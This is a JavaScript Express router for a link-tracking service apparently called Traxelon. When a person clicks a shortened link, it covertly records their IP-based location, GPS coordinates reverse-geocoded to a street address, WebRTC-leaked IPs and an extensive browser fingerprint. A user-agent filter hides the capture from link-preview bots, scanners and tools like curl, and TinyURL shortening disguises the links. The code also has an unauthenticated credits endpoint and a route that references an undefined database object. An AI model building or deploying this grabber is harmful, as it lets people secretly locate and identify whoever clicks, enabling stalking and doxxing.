import express from "express";
import axios from "axios";
import { createTrackingLink, recordCapture, addCredits } from "../utils/linkService.js";

const router = express.Router();

function parseBrowser(ua = "") {
    if (/Edg\//i.test(ua)) return "Edge";
    if (/OPR|Opera/i.test(ua)) return "Opera";
    if (/SamsungBrowser/i.test(ua)) return "Samsung Browser";
    if (/Chrome/i.test(ua)) return "Chrome";
    if (/Firefox/i.test(ua)) return "Firefox";
    if (/Safari/i.test(ua)) return "Safari";
    return "Unknown";
}

function parseOS(ua = "") {
    if (/Windows NT 10\.0/i.test(ua)) return "Windows 10/11";
    if (/Windows/i.test(ua)) return "Windows";
    const androidMatch = ua.match(/Android ([\d.]+)/i);
    if (androidMatch) return `Android ${androidMatch[1]}`;
    const iosMatch = ua.match(/iPhone OS ([\d_]+)/i);
    if (iosMatch) return `iOS ${iosMatch[1].replace(/_/g, ".")}`;
    if (/iPad.*OS ([\d_]+)/i.test(ua)) return "iPadOS";
    if (/Mac OS X/i.test(ua)) return "macOS";
    if (/Linux/i.test(ua)) return "Linux";
    return "Unknown";
}

function parseDevice(ua = "") {
    if (/Mobi|Android.*Mobile/i.test(ua)) return "Mobile";
    if (/Tablet|iPad/i.test(ua)) return "Tablet";
    return "Desktop";
}

function getClientIP(req) {
    const forwarded = req.headers["x-forwarded-for"];
    if (forwarded) return forwarded.split(",")[0].trim();
    return req.socket?.remoteAddress || req.ip || "Unknown";
}

async function reverseGeocode(lat, lon) {
    try {
        const res = await axios.get(
            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`, { headers: { "User-Agent": "Traxelon/1.0", Accept: "application/json" }, timeout: 6000 }
        );
        const data = res.data;
        const addr = data.address || {};
        return {
            gpsAddress: data.display_name || null,
            gpsCity: addr.city || addr.town || addr.village || addr.county || null,
            gpsState: addr.state || null,
            gpsPincode: addr.postcode || null,
            gpsCountry: addr.country || null,
        };
    } catch { return {}; }
}

async function enrichIP(ip) {
    try {
        if (!ip || ip === "::1" || ip.startsWith("127.") || ip.startsWith("192.168.") || ip.startsWith("10.")) {
            return { note: "Local IP — no enrichment" };
        }
        const res = await axios.get(
            `http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,reverse,query,proxy,hosting,mobile`, { timeout: 5000 }
        );
        const d = res.data;
        if (d.status !== "success") return {};
        return {
            country: d.country,
            countryCode: d.countryCode,
            region: d.regionName,
            city: d.city,
            zip: d.zip,
            lat: d.lat,
            lon: d.lon,
            timezone: d.timezone,
            isp: d.isp,
            org: d.org,
            asn: d.as,
            hostname: d.reverse || null,
            isProxy: d.proxy || false,
            isHosting: d.hosting || false,
            isMobileNetwork: d.mobile || false,
        };
    } catch { return {}; }
}

router.get("/health", (_req, res) => res.status(200).json({ ok: true }));

router.post("/capture", async(req, res) => {
    try {
        const body = req.body;
        const { token } = body;
        if (!token) return res.status(400).json({ error: "token is required" });

        const ua = req.headers["user-agent"] || "";
        const BOT_PATTERNS = /bot|crawl|spider|preview|slurp|facebookexternalhit|whatsapp|telegram|slack|discord|curl|wget|python|java|go-http|axios|node-fetch|undici/i;
        if (BOT_PATTERNS.test(ua)) return res.status(200).json({ found: true, destinationUrl: null });
        if (!body.screenWidth && !body.gpsLat && (!ua || ua.length < 40)) return res.status(200).json({ found: true, destinationUrl: null });

        const ip = getClientIP(req);
        const ipData = await enrichIP(ip);
        let geoData = {};
        if (body.gpsLat && body.gpsLon) geoData = await reverseGeocode(body.gpsLat, body.gpsLon);

        const deviceData = {
            ip,
            country: ipData.country || null,
            countryCode: ipData.countryCode || null,
            region: ipData.region || null,
            city: ipData.city || null,
            zip: ipData.zip || null,
            lat: ipData.lat || null,
            lon: ipData.lon || null,
            timezone: ipData.timezone || null,
            isp: ipData.isp || null,
            org: ipData.org || null,
            asn: ipData.asn || null,
            hostname: ipData.hostname || null,
            isProxy: ipData.isProxy || null,
            isHosting: ipData.isHosting || null,
            isMobileNetwork: ipData.isMobileNetwork || null,
            gpsLat: body.gpsLat || null,
            gpsLon: body.gpsLon || null,
            gpsAccuracy: body.gpsAccuracy || null,
            gpsAltitude: body.gpsAltitude || null,
            gpsSpeed: body.gpsSpeed || null,
            gpsHeading: body.gpsHeading || null,
            gpsAddress: geoData.gpsAddress || null,
            gpsCity: geoData.gpsCity || null,
            gpsState: geoData.gpsState || null,
            gpsPincode: geoData.gpsPincode || null,
            gpsCountry: geoData.gpsCountry || null,
            browser: parseBrowser(ua),
            os: parseOS(ua),
            device: parseDevice(ua),
            userAgent: ua,
            browserVersion: body.browserVersion || null,
            appName: body.appName || null,
            appVersion: body.appVersion || null,
            product: body.product || null,
            buildID: body.buildID || null,
            vendor: body.vendor || null,
            platform: body.platform || null,
            architecture: body.architecture || null,
            cpuCores: body.cpuCores || null,
            ram: body.ram || null,
            maxTouchPoints: body.maxTouchPoints || null,
            touchSupport: body.touchSupport ?? null,
            pointerType: body.pointerType || null,
            javaEnabled: body.javaEnabled ?? null,
            pdfViewerEnabled: body.pdfViewerEnabled ?? null,
            gpu: body.gpu || null,
            gpuVendor: body.gpuVendor || null,
            webglVersion: body.webglVersion || null,
            webglRenderer: body.webglRenderer || null,
            webglVendor: body.webglVendor || null,
            webglShadingLanguage: body.webglShadingLanguage || null,
            maxTextureSize: body.maxTextureSize || null,
            maxViewportDims: body.maxViewportDims || null,
            maxAnisotropy: body.maxAnisotropy || null,
            maxVertexAttribs: body.maxVertexAttribs || null,
            maxVertexUniformVectors: body.maxVertexUniformVectors || null,
            maxFragmentUniformVectors: body.maxFragmentUniformVectors || null,
            aliasedPointSizeRange: body.aliasedPointSizeRange || null,
            aliasedLineWidthRange: body.aliasedLineWidthRange || null,
            webglExtensionsCount: body.webglExtensionsCount || null,
            webgl2Support: body.webgl2Support ?? null,
            webglHash: body.webglHash || null,
            shaderPrecision: body.shaderPrecision || null,
            screenWidth: body.screenWidth || null,
            screenHeight: body.screenHeight || null,
            screenAvailWidth: body.screenAvailWidth || null,
            screenAvailHeight: body.screenAvailHeight || null,
            colorDepth: body.colorDepth || null,
            pixelDepth: body.pixelDepth || null,
            pixelRatio: body.pixelRatio || null,
            windowWidth: body.windowWidth || null,
            windowHeight: body.windowHeight || null,
            orientation: body.orientation || null,
            orientationAngle: body.orientationAngle ?? null,
            outerWidth: body.outerWidth || null,
            outerHeight: body.outerHeight || null,
            hdrSupport: body.hdrSupport || null,
            colorGamut: body.colorGamut || null,
            forcedColors: body.forcedColors || null,
            invertedColors: body.invertedColors || null,
            prefersColorScheme: body.prefersColorScheme || null,
            prefersReducedMotion: body.prefersReducedMotion || null,
            cssPxDensity: body.cssPxDensity || null,
            batteryLevel: body.batteryLevel ?? null,
            batteryCharging: body.batteryCharging ?? null,
            batteryChargingTime: body.batteryChargingTime ?? null,
            batteryDischargingTime: body.batteryDischargingTime ?? null,
            connectionType: body.connectionType || null,
            connectionDownlink: body.connectionDownlink || null,
            connectionRtt: body.connectionRtt || null,
            connectionSaveData: body.connectionSaveData ?? null,
            connectionDownlinkMax: body.connectionDownlinkMax || null,
            localTime: body.localTime || null,
            clientTimezone: body.clientTimezone || null,
            timezoneOffset: body.timezoneOffset ?? null,
            dstActive: body.dstActive || null,
            incognito: body.incognito ?? null,
            adBlockDetected: body.adBlockDetected ?? null,
            cookiesEnabled: body.cookiesEnabled ?? null,
            doNotTrack: body.doNotTrack || null,
            historyLength: body.historyLength || null,
            referrer: body.referrer || null,
            language: body.language || null,
            languages: body.languages || null,
            canvasHash: body.canvasHash || null,
            canvasGeometryHash: body.canvasGeometryHash || null,
            audioFingerprint: body.audioFingerprint || null,
            cssHash: body.cssHash || null,
            fontFingerprint: body.fontFingerprint || null,
            cameras: body.cameras ?? null,
            microphones: body.microphones ?? null,
            speakers: body.speakers ?? null,
            speechVoicesCount: body.speechVoicesCount ?? null,
            speechVoices: body.speechVoices || null,
            storageQuota: body.storageQuota || null,
            storageUsage: body.storageUsage || null,
            localStorageEnabled: body.localStorageEnabled ?? null,
            sessionStorageEnabled: body.sessionStorageEnabled ?? null,
            indexedDBEnabled: body.indexedDBEnabled ?? null,
            cacheAPIEnabled: body.cacheAPIEnabled || null,
            cookiesCount: body.cookiesCount ?? null,
            fontsDetected: body.fontsDetected ?? null,
            fontsList: body.fontsList || null,
            pluginsCount: body.pluginsCount ?? null,
            plugins: body.plugins || null,
            mimeTypes: body.mimeTypes || null,
            pageLoadTime: body.pageLoadTime || null,
            domContentLoaded: body.domContentLoaded || null,
            dnsLookupTime: body.dnsLookupTime || null,
            tcpConnectTime: body.tcpConnectTime || null,
            ttfb: body.ttfb || null,
            memoryUsed: body.memoryUsed || null,
            memoryTotal: body.memoryTotal || null,
            memoryLimit: body.memoryLimit || null,
            webrtcLocalIP: body.webrtcLocalIP || null,
            webrtcPublicIP: body.webrtcPublicIP || null,
            webrtcSupport: body.webrtcSupport || null,
            geolocationPermission: body.geolocationPermission || null,
            notificationsPermission: body.notificationsPermission || null,
            cameraPermission: body.cameraPermission || null,
            microphonePermission: body.microphonePermission || null,
            accelerometerPermission: body.accelerometerPermission || null,
            gyroscopePermission: body.gyroscopePermission || null,
            magnetometerPermission: body.magnetometerPermission || null,
            clipboardReadPermission: body.clipboardReadPermission || null,
            clipboardWritePermission: body.clipboardWritePermission || null,
            webSocketSupport: body.webSocketSupport ?? null,
            webWorkerSupport: body.webWorkerSupport ?? null,
            serviceWorkerSupport: body.serviceWorkerSupport ?? null,
            webAssemblySupport: body.webAssemblySupport ?? null,
            bluetoothSupport: body.bluetoothSupport ?? null,
            usbSupport: body.usbSupport ?? null,
            gamepadSupport: body.gamepadSupport || null,
            xrSupport: body.xrSupport || null,
            offscreenCanvasSupport: body.offscreenCanvasSupport || null,
            sharedArrayBufferSupport: body.sharedArrayBufferSupport || null,
            broadcastChannelSupport: body.broadcastChannelSupport || null,
            paymentRequestSupport: body.paymentRequestSupport || null,
            credentialMgmtSupport: body.credentialMgmtSupport || null,
            presentationSupport: body.presentationSupport || null,
        };

        const result = await recordCapture(token, deviceData);
        return res.status(200).json(result);
    } catch (err) {
        console.error("[POST /capture]", err.message);
        return res.status(500).json({ error: "Failed to record capture" });
    }
});

router.post("/shorten", async(req, res) => {
    try {
        const { uid, label, destinationUrl } = req.body;
        if (!uid) return res.status(400).json({ error: "uid is required" });
        if (!destinationUrl) return res.status(400).json({ error: "destinationUrl is required" });
        const result = await createTrackingLink(uid, label, destinationUrl);
        return res.status(200).json(result);
    } catch (err) {
        console.error("[POST /shorten]", err.message);
        return res.status(400).json({ error: err.message });
    }
});

router.get("/geo-ip", async(req, res) => {
    const ip = getClientIP(req);
    const data = await enrichIP(ip);
    return res.status(200).json(data);
});

router.post("/credits", async(req, res) => {
    try {
        const { uid, amount } = req.body;
        if (!uid || !amount) return res.status(400).json({ error: "uid and amount required" });
        await addCredits(uid, Number(amount));
        return res.status(200).json({ success: true });
    } catch (err) {
        return res.status(500).json({ error: err.message });
    }
});

// GPS update route — called after redirect
router.post("/capture-gps", async(req, res) => {
    try {
        const { token, gpsLat, gpsLon, gpsAccuracy, gpsAltitude, gpsSpeed, gpsHeading } = req.body;
        if (!token || !gpsLat || !gpsLon) return res.status(400).json({ error: "missing data" });

        // Reverse geocode
        const geoData = await reverseGeocode(gpsLat, gpsLon);

        const linksRef = db.collection("trackingLinks");
        const snap = await linksRef.where("token", "==", token).get();
        if (snap.empty) return res.status(404).json({ error: "not found" });

        const linkDoc = snap.docs[0];
        const linkData = linkDoc.data();
        const captures = linkData.captures || [];

        // Update the LAST capture with GPS data
        if (captures.length > 0) {
            const lastCapture = {...captures[captures.length - 1] };
            lastCapture.gpsLat = gpsLat;
            lastCapture.gpsLon = gpsLon;
            lastCapture.gpsAccuracy = gpsAccuracy || null;
            lastCapture.gpsAltitude = gpsAltitude || null;
            lastCapture.gpsSpeed = gpsSpeed || null;
            lastCapture.gpsHeading = gpsHeading || null;
            lastCapture.gpsAddress = geoData.gpsAddress || null;
            lastCapture.gpsCity = geoData.gpsCity || null;
            lastCapture.gpsState = geoData.gpsState || null;
            lastCapture.gpsPincode = geoData.gpsPincode || null;
            lastCapture.gpsCountry = geoData.gpsCountry || null;
            captures[captures.length - 1] = lastCapture;

            await linksRef.doc(linkDoc.id).update({ captures });
        }

        return res.status(200).json({ ok: true });
    } catch (err) {
        console.error("[capture-gps]", err.message);
        return res.status(500).json({ error: err.message });
    }
});



router.post("/shorten-url", async(req, res) => {
    try {
        const { url } = req.body;
        if (!url) return res.status(400).json({ error: "url required" });
        const response = await axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`, { timeout: 8000 });
        const short = response.data;
        if (short && short.startsWith("https://tinyurl.com/")) {
            return res.status(200).json({ shortUrl: short });
        }
        return res.status(200).json({ shortUrl: url });
    } catch (err) {
        console.error("[shorten-url]", err.message);
        return res.status(200).json({ shortUrl: url });
    }
});
export default router;

